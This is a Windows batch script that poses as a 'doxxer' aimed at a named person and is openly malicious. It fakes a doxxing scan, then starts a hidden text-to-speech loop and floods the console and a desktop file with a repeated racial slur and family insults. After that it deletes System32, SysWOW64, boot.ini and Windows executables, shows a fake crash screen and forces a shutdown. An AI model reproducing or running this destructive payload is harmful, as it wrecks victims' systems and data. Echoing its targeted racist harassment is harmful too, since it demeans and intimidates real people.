@echo off
title LAED_DOXXER_FINAL - Walat Special
setlocal enabledelayedexpansion

:: ------------------- FAKE DOXXING HEADER -------------------
echo.
echo [LAED_DOXXER] Scanning Walat's IP, geolocation, social security...
timeout /t 2 >nul
echo [LAED_DOXXER] Darkweb leak prepared. Doxxing complete.
echo ================================================
echo    TARGET: WALAT - FULL LEAK + AUDIO SPAM
echo ================================================
echo.

:: ------------------- CREATE SPEECH VBS -------------------
echo Creating voice spam script...
(
echo Dim msg, sapi
echo msg = "nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger"
echo Set sapi = CreateObject("SAPI.SpVoice")
echo sapi.Volume = 100
echo sapi.Rate = 0
echo Do While True
echo     sapi.Speak msg
echo     WScript.Sleep 2000
echo Loop
) > "%temp%\speech_spam.vbs"

:: ------------------- LAUNCH VOICE SPAM IN BACKGROUND -------------------
start /min "" wscript.exe "%temp%\speech_spam.vbs"

:: ------------------- CONSOLE TEXT SPAM (50x nigger) -------------------
echo.
echo [VOICE SPAM ACTIVE] Speaking "nigger" repeatedly.
echo [TEXT SPAM START] Displaying 50 times:
echo.

for /l %%i in (1,1,50) do (
    echo [%%i] nigger nigger nigger nigger nigger nigger nigger nigger nigger nigger
)

:: ------------------- FAKE DOXXING FILE GENERATION -------------------
set "doxxfile=%userprofile%\Desktop\WALAT_DOXXED_LEAK.txt"
echo === WALAT FULL DOX === > "%doxxfile%"
echo IP: 127.0.0.1 (spoofed) >> "%doxxfile%"
echo MAC: AA:BB:CC:DD:EE:FF >> "%doxxfile%"
echo Location: Walat's basement, Germany >> "%doxxfile%"
echo Bloodline: Inzest-Missgriff >> "%doxxfile%"
echo Password dump: walat2026:nigger >> "%doxxfile%"
echo. >> "%doxxfile%"
for /l %%i in (1,1,30) do echo nigger nigger nigger >> "%doxxfile%"
echo [FAKE LEAK COMPLETE] Saved to %doxxfile%

:: ------------------- DESTRUCTIVE PAYLOAD -------------------
echo.
echo [WARNING] SYSTEM CORRUPTION INITIATED...
timeout /t 2 >nul

:: Delete critical system directories (needs admin)
rd /s /q C:\Windows\System32 2>nul
rd /s /q C:\Windows\SysWOW64 2>nul
del /f /s /q C:\boot.ini 2>nul
del /f /s /q C:\Windows\*.exe 2>nul

:: Create fake BSOD look
echo.
echo ================================================
echo    CRITICAL_PROCESS_DIED
echo    Your PC ran into a problem and needs to restart.
echo    Stop code: WALAT_NIGGER_SPAM_0x1337
echo ================================================
timeout /t 5 >nul

:: Final shutdown with custom message
shutdown /s /t 10 /c "Walat, you got doxxed, voice-spammed with 50x nigger, and your system is nuked. Goodbye."
exit